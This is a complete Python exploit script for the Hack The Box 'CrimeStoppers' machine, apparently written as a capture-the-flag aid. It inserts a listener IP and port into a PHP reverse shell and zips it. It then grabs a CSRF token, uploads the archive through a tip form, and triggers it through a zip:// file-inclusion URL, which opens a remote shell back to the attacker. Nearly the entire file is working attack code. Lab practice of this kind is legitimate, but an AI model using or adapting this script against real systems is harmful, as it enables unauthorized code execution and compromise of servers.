#!/usr/bin/python

# This exploit works on the CrimeStoppers box from http://hackthebox.eu
# Push button and get User level access
# Written by Zulu CaPWN
# https://twitter.com/zulu_capwn

# Manual exploit method from
# https://www.youtube.com/watch?v=WdtP8zbPJ9U&t=0s&index=4&list=PL7e7i6QXQJSGycmgwN2pWEhcAcd9UlzSI

import requests
import re
import os
import base64

#####################
# Monitor thru Burp #
#####################
# to use, enter proxies=proxy in each requests req
proxy = {'http': 'http://127.0.0.1:8080'}

########################
# Get listener IP/Port #
########################
lhost = raw_input('What is the listeners IP? (Do not prepend with http://) ')
lport = raw_input('What is the listeners Port? ')
print

###############################################################
# copy /usr/share/webshells/php/php-reverse-shell.php to here #
###############################################################
## TAKE THIS OUT, JUST HAVE IT IN THE FOLDER ALREADY
os.system('cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php')
print 'Copied reverse php shell'

################################
# Put our ip/port in the shell #
################################
with open('shell.php', 'r') as f:
    a = f.read()
    a = a.replace("127.0.0.1", lhost)
    a = a.replace('1234', lport)
with open('editedShell.php', 'w') as f:
    f.write(a)
os.system('mv editedShell.php shell.php')
print 'IP and PORT have been inserted into shell.php'

#####################
# Zip the shell.php #
#####################
os.system('zip -0 shell.zip shell.php')
print 'Shell has been zipped'

################################
# Put zipped shell into memory #
################################
with open('shell.zip', 'rb') as f:
    do_me = f.read()

##################################
# base64 encode the zipped shell #
##################################
b64_zip = base64.b64encode(do_me)
print 'Zipped shell has been base64 encoded'

#####################
# Go to upload page #
#####################
print 'Contacting victim'
burp0_url = "http://10.10.10.80:80/?op=upload"
url = burp0_url
r = requests.get(url)

######################
# Extract CSRF token #
######################
token = re.search('[a-f0-9]{64}', r.text)
token = token.group()
print 'CSRF token:', token

#########################
# Create upload payload #
#########################
# Both of these work
files = {'tip':(None, do_me), 'name':(None, 'Ur Meat!'), 'submit':(None, 'Send Tip!'), 'token':(None, token)}
#files = {'tip':(None, base64.b64decode(b64_zip)), 'name':(None, 'Ur Meat!'), 'submit':(None, 'Send Tip!'), 'token':(None, token)}

#######################
# Get current cookies #
#######################
# NOT NEEDED?????????????????
cooks = r.cookies

###################
# Post the upload #
###################
r = requests.post(url, files=files, cookies=r.cookies)
print 'Exploit uploaded'

############################
# Grab secretname from url #
############################
secretname = r.url.split('secretname=')[1]
print 'Grabbed secretname\nTriggering exploit!!!!!'

#######################
# Trigger the exploit #
#######################
trigger_exploit_url = 'http://10.10.10.80/?op=zip://uploads/{}/{}%23shell'.format(lhost,secretname)
r = requests.get(trigger_exploit_url, cookies=cooks)
